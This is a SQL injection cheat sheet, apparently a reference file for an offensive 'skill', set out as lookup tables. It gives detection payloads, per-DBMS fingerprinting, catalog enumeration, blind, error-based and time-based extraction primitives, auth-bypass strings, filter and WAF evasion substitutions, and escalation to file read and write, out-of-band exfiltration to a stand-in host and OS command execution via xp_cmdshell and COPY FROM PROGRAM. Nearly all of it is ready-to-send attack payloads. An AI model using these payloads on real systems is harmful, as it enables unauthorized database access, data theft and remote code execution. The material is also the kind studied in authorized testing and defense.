# Cheatsheet — the field-manual tables

The whole skill compressed into lookup tables. When the corpus is
too big to hold, start here; the section name in each row names
the reference file to open for depth.

---

## 1. Detection — first ten sends

| # | Payload | What it tells you |
|---|---|---|
| 1 | `{v}'` | SQL error → injectable string context |
| 2 | `{v}"` | error → double-quoted context |
| 3 | `{v})` `{v}'))` | error → parenthesised context |
| 4 | `{v}''` | clean again → interpolation confirmed |
| 5 | `{v}' AND '1'='1` vs `' AND '1'='2` | boolean oracle |
| 6 | `{v}' OR '1'='1` vs `' OR '1'='2` | OR oracle |
| 7 | `{v}' AND SLEEP(3)` [M] | time channel |
| 8 | `{v}' AND (SELECT pg_sleep(3))` [P] | time channel |
| 9 | `{v}'; WAITFOR DELAY '0:0:3'` [S] | time channel |
| 10 | `{v}' UNION SELECT NULL-- -` | UNION surface |

---

## 2. DBMS fingerprint — one-shot discriminators

| Send | MySQL | PG | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| `version()` | str | str | err | err | err |
| `@@version` | str | err | str | err | err |
| `sqlite_version()` | err | err | err | err | str |
| `FROM dual` | ok | err | ok | ok | ok* |
| `'a'\|\|'b'` | err/0 | 'ab' | err | 'ab' | 'ab' |
| `concat('a','b')` | ok | ok | 2012+ | ok | err |
| `IF(1,2,3)` | 2 | err | err | err | err |
| `IIF(1,2,3)` | err | err | ok | err | ok |
| `sleep(1)` | sleeps | err | err | err | err |
| `pg_sleep(1)` | err | sleeps | err | err | err |
| `WAITFOR DELAY` | err | err | delay | err | err |
| `LIMIT` | ok | ok | err | err | ok |
| `TOP` | err | err | ok | err | err |
| `ROWNUM` | err | err | err | ok | err |
| `substr` | ok | ok | err | ok | ok |
| `substring` | ok | ok | ok | ok | ok |
| `len` | err | err | ok | err | err |
| `length` | ok | ok | err | ok | ok |

\* SQLite `FROM dual` only fails if `dual` doesn't exist — treat
as err.

---

## 3. Catalog tables per DBMS

| DBMS | databases | tables | columns | version | user |
|---|---|---|---|---|---|
| MySQL | `information_schema.schemata` | `information_schema.tables` | `information_schema.columns` | `@@version` `version()` | `user()` `current_user` |
| MariaDB | same + `seq_*` | same | same | `version()` (has `-MariaDB`) | same |
| PG | `pg_database` `datname` | `pg_tables` `information_schema.tables` | `information_schema.columns` `pg_attribute` | `version()` | `current_user` `session_user` |
| MSSQL | `sys.databases` `master..sysdatabases` | `sys.tables` `sysobjects` | `sys.columns` `syscolumns` | `@@version` | `system_user` `SUSER_SNAME()` |
| Oracle | `v$database` | `all_tables` `user_tables` | `all_tab_columns` `user_tab_columns` | `v$version` `banner` | `user` `SYS_CONTEXT('USERENV','...')` |
| SQLite | `pragma_database_list` | `sqlite_master` | `sqlite_master.sql` `pragma_table_info` | `sqlite_version()` | n/a (process user) |
| DB2 | `syscat.schemata` | `syscat.tables` | `syscat.columns` | `sysibm.sysversions` | `current_user` |
| H2 | `INFORMATION_SCHEMA.SCHEMATA` | `INFORMATION_SCHEMA.TABLES` | `INFORMATION_SCHEMA.COLUMNS` | `H2VERSION()` | `current_user` |
| ClickHouse | `system.databases` | `system.tables` | `system.columns` | `version()` | `current_user` |
| Firebird | `rdb$database` | `rdb$relations` | `rdb$relation_fields` | `rdb$get_context` | `current_user` |
| Informix | `sysmaster:*` | `systables` | `syscolumns` | `dbinfo('version')` | `user` |
| HANA | `M_DATABASES` `SYS.SCHEMAS` | `SYS.TABLES` | `SYS.COLUMNS` | `M_VERSION` | `current_user` |

---

## 4. Extraction — per channel

| Channel | Primitive | DBMS | Limit |
|---|---|---|---|
| UNION | `UNION SELECT ...,col,...` | all | reflected col type |
| error echo | `extractvalue(1,concat(0x7e,x))` | M | ~32 chars |
| error echo | `updatexml(1,concat(0x7e,x),1)` | M | ~32 |
| error echo | dup-entry `CONCAT(x,FLOOR(RAND(0)*2))` | M | ~64 |
| error echo | `CAST(x AS int)` | P S | full |
| error echo | `CONVERT(int,x)` | S | full |
| error echo | `utl_inaddr.get_host_name(x)` | O | ~60 |
| error echo | `RAISERROR(x,16,1)` | S | stacked |
| boolean | `SUBSTRING(x,i,1)='c'` | all | 8 req/char |
| boolean | `LIKE 'prefix%'` | all | prefix shape |
| boolean | `REGEXP '^pre[c]'` | M | range probes |
| boolean | `~ '^pre'` | P | range |
| boolean | `IN (list)` | all | slice probes |
| time | `IF(cond,SLEEP(n),0)` | M | delay-known |
| time | `pg_sleep(n)` | P | delay |
| time | `WAITFOR DELAY 'h:m:s'` | S | delay |
| time | `dbms_pipe.receive_message('x',n)` | O | delay |
| time | `randomblob(N)` / like-torture | L | CPU |
| time | `BENCHMARK(n,expr)` | M | CPU |
| time | heavy cartesian join | all | CPU |
| OOB | `LOAD_FILE('\\\\x.me\\a')` | M | Windows only |
| OOB | `xp_dirtree '\\x.me\a'` | S | needs priv |
| OOB | `utl_inaddr.get_host_*` | O | needs priv |
| OOB | `utl_http.request` | O | ACL-gated |
| OOB | `dblink_connect` | P | ext installed |
| OOB | `COPY...FROM PROGRAM` | P | superuser |
| file read | `LOAD_FILE` | M | FILE priv + secure_file_priv |
| file read | `pg_read_file` | P | superuser / role |
| file read | `OPENROWSET(BULK)` | S | ad-hoc enabled |
| file read | `UTL_FILE` | O | dir object + grant |
| file read | `readfile()` | L | CLI-linked ext |
| file read | `FILE_READ`/`CSVREAD` | H2 | alias enabled |
| file write | `INTO OUTFILE`/`DUMPFILE` | M | FILE priv |
| file write | `COPY...TO` | P | superuser |
| file write | `xp_cmdshell` echo | S | xp_cmdshell |
| file write | `UTL_FILE.FOPEN 'W'` | O | dir + grant |
| file write | `ATTACH`+`CREATE`+`INSERT` | L | stacked |
| file write | `writefile()` | L | ext fn |
| exec | `xp_cmdshell` | S | enableable via sp_configure |
| exec | `sp_OACreate`/`OAMethod` | S | OLE enabled |
| exec | `COPY...FROM PROGRAM` | P | superuser |
| exec | `CREATE ALIAS`+`CALL` | H2 | alias enabled |
| exec | `load_extension` | L | usually off |
| exec | UDF `sys_exec` | M | FILE+plugin_dir+mysql.func |
| exec | Java SP | O | JAVA privs |
| exec | `dbms_scheduler` | O | CREATE JOB |

---

## 5. The sort-order oracle

`sort=if(cond,a,b)` — first row tells the answer:

| Observed | Means |
|---|---|
| rows sort by `a` | cond true |
| rows sort by `b` | cond false |
| same order both | sort param not injectable |
| error both | syntax wrong — check quoting |

---

## 6. The auth-bypass five

```text
admin'-- -
' OR '1'='1'-- -
x' OR '1'='1' OR 'x'='y
' UNION SELECT 1,'admin','pass'-- -   (forge row)
admin' AND SUBSTRING(password,1,1)='5'-- -   (blind)
```

Full catalogue: `auth-bypass.md`.

---

## 7. The comment/terminator table

| Marker | MySQL | PG | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| `--` | ✓ needs space | ✓ | ✓ | ✓ | ✓ |
| `-- ` URL | `--%20` `--+` `--%20` | same | same | same | same |
| `#` | ✓ | ✗ | ✗ | ✗ | ✗ |
| `/*..*/` | ✓ | ✓ | ✓ | ✓ | ✓ |
| `;%00` | ✓ | ~ | ~ | ✗ | ~ |
| `/*!..*/` exec | ✓ version-gated | ✗ | ✗ | ✗ | ✗ |

---

## 8. Whitespace alternatives

| Byte | MySQL | PG | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| `%20` space | ✓ | ✓ | ✓ | ✓ | ✓ |
| `%09` tab | ✓ | ✓ | ✓ | ✓ | ✓ |
| `%0A` LF | ✓ | ✓ | ✓ | ✓ | ✓ |
| `%0B` VT | ✓ | ✓ | ✓ | ? | ? |
| `%0C` FF | ✓ | ✓ | ✓ | ? | ? |
| `%0D` CR | ✓ | ✓ | ✓ | ✓ | ? |
| `%A0` NBSP | ✓ | ? | ✓ | ? | ? |
| `/**/` comment | ✓ | ✓ | ✓ | ✓ | ✓ |
| `()` parens | ✓ | ✓ | ✓ | ✓ | ✓ |

---

## 9. Keyword substitutions

| Blocked | Substitutes |
|---|---|
| `UNION` | `UNION ALL`, `UNION DISTINCT`, `UN/**/ION`, `UNI/**/ON`, `UNION(SELECT` |
| `SELECT` | `SEL/**/ECT`, `/*!50000SELECT*/`, `(SELECT`, `SE/**/LECT` |
| `AND` | `&&`, `AND`, `LIKE`, `IN`, `BETWEEN`, `OR NOT` |
| `OR` | `\|\|`, `XOR`, `AND NOT` |
| `=` | `LIKE`, `RLIKE`, `REGEXP`, `IN`, `BETWEEN`, `<=>` |
| `SLEEP` | `BENCHMARK(n,expr)`, `pg_sleep`, `WAITFOR`, `dbms_pipe`, heavy join |
| `IF` | `CASE WHEN`, `IIF` [S L], `ELT` [M] |
| `SUBSTRING` | `SUBSTR`, `MID`, `LEFT`, `RIGHT`, `LPAD`, `RPAD`, `INSERT(str,pos,len,new)` |
| `ASCII` | `ORD` [M], `UNICODE` [S L], `CONV(HEX(c),16,10)` [M] |
| `CONCAT` | `\|\|` [P O L], `+` [S], `CONCAT_WS` [M] |
| `DATABASE()` | `DB_NAME()` [S], `current_database()` [P], `schema()` [M], `SYS_CONTEXT` [O] |
| `USER()` | `current_user`, `system_user`, `session_user`, `SUSER_SNAME()` [S] |
| `VERSION()` | `@@version` [M S], `version()` [M P], `sqlite_version()` [L], `v$version` [O], `H2VERSION()` [H2] |
| `INFORMATION_SCHEMA` | `sys.*` [S], `pg_*` [P], `sqlite_master` [L], `all_*`/`user_*` [O], `syscat.*` [DB2] |
| `'` | `0x27` hex, `CHAR(39)`, `$$..$$` [P], `q'[..]'` [O], `\u0027` JSON |
| ` ` | `%09` `%0A` `%0C` `/**/` `()` |
| `--` | `#` [M], `/*..*/`, `;%00`, balance the query |
| `LOAD_FILE` | `OPENROWSET(BULK)` [S], `pg_read_file` [P], `UTL_FILE` [O], `readfile` [L], `FILE_READ`/`CSVREAD` [H2] |

---

## 10. Second-order five-step

```text
write marker  →  read site found  →  ZZZ' probe  →  boolean pair
→  extract via x'||(SELECT secret)||'
```

`second-order.md` for the full loop.

---

## 11. Extraction order

```text
databases → tables (in target db) → columns (in target table)
→ rows → (optionally) file read → file write → exec → OOB
```

---

## 12. Response-decision matrix

| Response | Means | Next |
|---|---|---|
| SQL error | syntax reached SQL | fingerprint DBMS |
| 200 same as baseline | filtered or no reach | try OR/paren/comment |
| 200 + data change | boolean oracle | blind extraction |
| 200 + delay | time channel | time payloads |
| 302/redirect | auth-redirect | auth-bypass family |
| 403 | WAF block | waf-evasion.md |
| 500 no echo | query broke, no echo | try other syntax |
| empty 200 | result filtered | error-based echo |
| timeout | heavy query / tarpit | slow down, or it fired |

---

## 13. Operator / function map per DBMS

| Task | MySQL | PG | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| concat | `concat` `\|\|` | `\|\|` `concat` | `+` `concat` `concat_ws` | `\|\|` `concat` | `\|\|` |
| substring | `substring` `substr` `mid` `left` `right` | `substring` `substr` `left` `right` `split_part` | `substring` `left` `right` `charindex` | `substr` `instr` | `substr` `instr` `ltrim` `rtrim` |
| length | `length` `char_length` `bit_length` | `length` `char_length` `octet_length` `bit_length` | `len` `datalength` | `length` `lengthb` `vsize` | `length` |
| position | `instr` `locate` `position` `find_in_set` | `position` `strpos` | `charindex` `patindex` | `instr` | `instr` |
| char→code | `ascii` `ord` | `ascii` | `unicode` | `ascii` | `unicode` |
| code→char | `char` | `chr` | `char` `nchar` | `chr` | `char` `unicode`→val |
| hex | `hex` `unhex` `0x` | `encode(...,'hex')` `decode` | `convert` `fn_varbintohexstr` | `rawtohex` `hextoraw` | `hex` `unhex` |
| base64 | `to_base64` `from_base64` | `encode(...,'base64')` `decode` | — | `utl_encode.base64_encode` `utl_encode` | — |
| md5 | `md5` | `md5` | `hashbytes('MD5',x)` | `dbms_crypto.hash` | — |
| sha1 | `sha1` `sha` | `digest(x,'sha1')` | `hashbytes('SHA1',x)` | `dbms_crypto.hash` | — |
| uppercase | `upper` `ucase` | `upper` | `upper` | `upper` | `upper` |
| lowercase | `lower` `lcase` | `lower` | `lower` | `lower` | `lower` |
| trim | `trim` `ltrim` `rtrim` | `trim` `ltrim` `rtrim` `btrim` | `trim` `ltrim` `rtrim` | `trim` `ltrim` `rtrim` | `trim` `ltrim` `rtrim` |
| replace | `replace` | `replace` | `replace` `stuff` | `replace` | `replace` |
| repeat | `repeat` | `repeat` | `replicate` | `rpad` `lpad` | `printf` `replace` |
| rand | `rand` | `random` | `rand` `newid` `crypt_gen_random` | `dbms_random.value` | `random` `randomblob` |
| now | `now` `sysdate` `current_timestamp` | `now` `current_timestamp` `clock_timestamp` | `getdate` `sysdatetime` `getutcdate` | `sysdate` `systimestamp` `current_timestamp` | `datetime('now')` `date('now')` `time('now')` `julianday('now')` |
| version | `version` `@@version` | `version` | `@@version` | `v$version` `banner` | `sqlite_version` `sqlite_source_id` |
| user | `user` `current_user` `system_user` | `current_user` `session_user` `user` | `system_user` `current_user` `suser_sname` `original_login` | `user` `sys_context('USERENV',..)` | — |
| db | `database` `schema` | `current_database` `current_schema` | `db_name` `db_id` `original_db_name` | `sys_context('USERENV','DB_NAME')` `sys_context('USERENV','CURRENT_SCHEMA')` | `pragma_database_list` |
| host | `@@hostname` `@@basedir` `@@datadir` `@@tmpdir` `@@socket` `@@pid_file` | `inet_server_addr` `inet_server_port` `current_setting('port')` | `serverproperty('MachineName')` `serverproperty('InstanceName')` `serverproperty('ServerName')` | `utl_inaddr.get_host_name` `sys_context('USERENV','HOST')` `sys_context('USERENV','TERMINAL')` | — |
| sleep | `sleep` `benchmark` | `pg_sleep` `generate_series` | `waitfor delay` `waitfor time` | `dbms_pipe.receive_message` `dbms_lock.sleep` | `randomblob` `like`-torture cartesian |
| conditional | `if` `case` `elt` | `case` | `case` `iif` | `decode` `case` | `case` `iif` |
| cast | `cast` `convert` | `cast` `::` | `cast` `convert` | `cast` `to_char` `to_number` `to_date` | `cast` |
| coalesce | `ifnull` `coalesce` | `coalesce` `nullif` | `isnull` `coalesce` `nullif` | `nvl` `nvl2` `coalesce` `decode` | `ifnull` `coalesce` `nullif` `iif` |
| regexp | `regexp` `rlike` `regexp_substr` `regexp_replace` `regexp_instr` | `~` `~*` `!~` `regexp_matches` `regexp_replace` `regexp_split_to_table` | `like` `patindex` | `regexp_like` `regexp_instr` `regexp_substr` `regexp_replace` `regexp_count` | `regexp` (ext) `glob` `like` |
| group-concat | `group_concat` `json_arrayagg` | `string_agg` `array_agg` `array_to_string` `json_agg` `jsonb_agg` `json_object_agg` | `string_agg` `for xml path` `for json` `stuff` | `listagg` `xmlagg` `json_arrayagg` `json_objectagg` `sys_connect_by_path` `wm_concat` | `group_concat` `json_group_array` `json_group_object` |
| file-read | `load_file` `load data infile` | `pg_read_file` `pg_read_binary_file` `copy from` `lo_import` `pg_ls_dir` `pg_stat_file` | `openrowset(bulk)` `bulk insert` `xp_cmdshell type` `xp_dirtree` `xp_fileexist` `xp_regread` | `utl_file` `httpuritype` `external table` `ctxsys` | `readfile` (ext) `edit` |
| file-write | `into outfile` `into dumpfile` `general_log` `slow_query_log` | `copy ... to` `lo_export` `largeobject` | `xp_cmdshell` `sp_oacreate fso` `bcp` `bulk insert` (from-share) | `utl_file.fopen 'w'` `dbms_lob` `java sp` | `writefile` (ext) `attach`+`insert` |
| exec | udf `sys_exec` `sys_eval` `lib_mysqludf_sys` | `copy ... from program` `dblink` `plpython3u` `plperlu` `pltclu` | `xp_cmdshell` `sp_oacreate` `sp_oamethod` `sp_add_job` `clr` `xp_regwrite` | java stored proc `dbms_scheduler` `extproc` `utl_tcp` | `load_extension` |
| error-echo | `extractvalue` `updatexml` `floor(rand(0)*2)` `gtid_subset` `exp` `pow` `json_keys` `bigint-ovf` | `cast` `::` `to_number` `xml` parse `json` cast `array` idx | `convert` `cast` `raiserror` `1/x` `for xml` injection | `utl_inaddr` `ctxsys.drithsx.sn` `ctx_report` `dbms_xdb_version` `xmltype` parse `extractvalue` `ordsys.ord_dicom` `to_number` `dbms_xmlgen` `sqlid_to_sqlhash` | weak — `load_extension` err, `abs(bigint)` overflow |
| out-of-band | `load_file('\\\\x\\')` `secure_auth` smb | `dblink` `copy program` `plperl` `http` ext | `xp_dirtree` `xp_fileexist` `xp_subdirs` `xp_regread` `openrowset` `bulk insert from unc` `sp_oamethod` `clr` | `utl_inaddr` `utl_http` `utl_tcp` `dbms_ldap` `dbms_xdb` `httpuritype` `extractvalue` `xmltype` `sys_xmlgen` | none |
| limit | `limit` `limit x,y` | `limit` `offset` `fetch first` | `top` `offset ... fetch` | `rownum` `fetch first` `row_number` | `limit` `limit x,y` |
| quote | `'` `"` `` ` `` `\` esc | `'` `"` `$$` `E'..'` | `'` `[]` `N'..'` | `'` `q'[..]'` `chr(39)` | `'` `"` `x'..'` |

---

## 14. The one-request-per-value channel ranking

```text
error-echo  (1 req → ~30-64 chars or full value)
UNION agg   (1 req → whole table via group_concat/string_agg/...)
OOB         (1 req → ~50 chars via DNS)
row-order   (1 req → 1 bit via first-vs-second row)
prefix-LIKE (1 req → confirms 'flag{a' shape — fast pruning)
IN-set      (1 req → 3-5 candidate chars)
binary      (8 reqs → 1 char — the default)
delay-len   (1 req → whole char in the delay amount)
```

Use the fastest channel that fires. `advanced-extraction.md` is the
full methodology; `boolean-blind.md` is the fallback loop.
